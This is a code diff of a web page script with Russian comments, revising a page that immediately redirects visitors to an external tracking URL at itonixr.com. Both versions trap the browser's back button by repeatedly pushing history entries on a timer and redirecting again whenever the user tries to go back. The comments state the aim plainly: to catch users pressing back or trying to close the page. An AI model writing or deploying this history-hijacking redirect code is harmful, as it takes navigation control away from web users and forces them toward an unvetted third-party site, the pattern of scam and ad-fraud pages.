@@ -10,30 +10,28 @@
     const redirectUrl = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851';
 
     function trapHistory() {
-      history.pushState(null, '', window.location.href);
+      // Постоянно добавляем записи в историю, чтобы ловить "назад"
+      history.pushState({}, '', window.location.href);
     }
 
     function redirectToTarget() {
-      window.location.replace(redirectUrl); // Быстрый редирект без добавления в историю
+      window.location.href = redirectUrl;
     }
 
     document.addEventListener('DOMContentLoaded', () => {
-      // Моментальный редирект при загрузке
+      // Изначальный редирект сразу после загрузки
       redirectToTarget();
 
-      // Наполняем стек истории сразу
-      for (let i = 0; i < 10; i++) {
-        trapHistory();
-      }
+      // Наполняем стек истории и ловим кнопку "назад" или крестик
+      trapHistory();
 
-      // Перехват кнопки "Назад"
       window.onpopstate = () => {
         console.log('User pressed back or tried to close the app');
         redirectToTarget();
       };
 
-      // Поддерживаем ловушку истории активной
-      setInterval(trapHistory, 300);
+      // Повторяем ловушку каждые 500 мс, чтобы сохранить историю активной
+      setInterval(trapHistory, 500);
     });
   </script>
 </head>
